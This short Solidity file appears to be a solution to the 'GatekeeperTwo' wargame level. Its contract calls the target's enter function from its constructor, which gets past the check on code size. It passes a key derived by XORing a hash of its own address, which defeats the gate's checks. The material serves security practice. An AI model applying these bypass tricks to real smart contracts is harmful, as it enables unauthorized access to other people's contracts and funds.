// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./GatekeeperTwo.sol";

contract AttackGatekeeperTwo {
    GatekeeperTwo public gate;

    constructor(address gate_) {
        gate = GatekeeperTwo(gate_);
        uint64 senderToUint64 = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes8 key = bytes8(senderToUint64 ^ type(uint64).max);
        gate.enter(key);
    }
}
